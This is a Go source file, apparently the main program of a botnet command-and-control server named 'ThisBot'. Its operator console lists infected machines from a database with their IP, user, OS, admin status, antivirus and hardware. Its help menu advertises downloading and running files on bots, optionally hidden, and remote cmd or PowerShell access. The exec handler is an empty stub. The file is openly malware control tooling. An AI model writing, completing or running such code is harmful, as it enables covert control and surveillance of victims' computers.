package main

import (
	"ThisBot/common"
	"ThisBot/config"
	"ThisBot/db1"
	"ThisBot/utils"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path"
	"runtime"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

func show_banner() {
	var banner string = "\n" + `___________.__    .__       __________        __ ` + "\n" +
		`\__    ___/|  |__ |__| _____\______   \ _____/  |_ ` + "\n" +
		`  |    |   |  |  \|  |/  ___/|    |  _//  _ \   __\` + "\n" +
		`  |    |   |   Y  \  |\___ \ |    |   (  <_> )  |  ` + "\n" +
		`  |____|   |___|  /__/____  >|______  /\____/|__|  ` + "\n" +
		`  	        \/        \/        \/             ` + common.Version + "\n" +
		"                                                   Author: Nec0Arc" + "\n"
	fmt.Println(banner)
}

func help_handler() {
	fmt.Println("1. help/h: Show help menu")
	fmt.Println("2. exec [option] path/url: Execute executable file or download from host and execute, option could be -h means hide file")
	fmt.Println("3. cmd/pws: Remote cmd or powershell")
	fmt.Println("4. list: Show all bots")
	fmt.Println("5. info id: Show bot info which ID is id")
}

func exec_handler(ary []string) {
	// if len(ary)
}

func list_handler() {
	sqlStr := "select * from clients"
	var bot common.Client
	rows, err := db1.QueryRows(common.Db, sqlStr)
	if err != nil {
		log.Println(err.Error())
		return
	}
	fmt.Printf("id | guid | token | ip | whoami | os | installdate | isadmin | antivirus | cpuinfo | gpuinfo | clientversion | lastseen | lastcommand |\n")
	for rows.Next() {
		rows.Scan(&bot)
		fmt.Printf("%d %s %s %s %s %s %s %s %s %s %s %s %s %s\n",
			bot.Id, bot.Guid, bot.Token, bot.Ip, bot.Whoami, bot.Os, bot.Installdate, bot.Isadmin,
			bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, bot.Lastseen, bot.Lastcommand)
	}
}

func clear_handler() {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("cmd")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func main() {
	if len(os.Args) > 1 && os.Args[1] == "--init-config" {
		err := config.GenerateDefaultConfig(common.ConfigDefaultFileName)
		if err != nil {
			log.Fatal("config.GenerateDefaultConfig failed")
			return
		}
		log.Println("Generate default configure file successfully, please check it and restart the server")
		return
	}

	// Check the configure file exists or not
	config_path, _ := os.Getwd()
	config_path = path.Join(config_path, common.ConfigDefaultFileName)
	if !utils.FileExist(config_path) {
		log.Fatal("Can't find configure file, please add --init-config option to generate it first")
		return
	}
	// Load config
	pCfg := config.LoadConfig(config_path)
	if pCfg == nil {
		log.Fatal("Failed to load configure file")
		return
	}
	common.Cfg = *pCfg

	// Initialize all
	config.Init(&common.Cfg)

	// Running the task cleaner
	task_cleaner(common.Db, 5*60)
	// Running the server
	go Server()

	time.Sleep(1000)

	// Running command panel
	var command string = ""
	show_banner()
	for {
		fmt.Print("$ ")
		fmt.Scanln(&command)
		command = strings.TrimSpace(command)
		cmdAry := strings.Fields(command)

		switch cmdAry[0] {
		case "list":
			list_handler()
		case "help", "h":
			help_handler()
		case "exec":
			exec_handler(cmdAry)
		case "clear":
			clear_handler()
			show_banner()
		}
	}

}
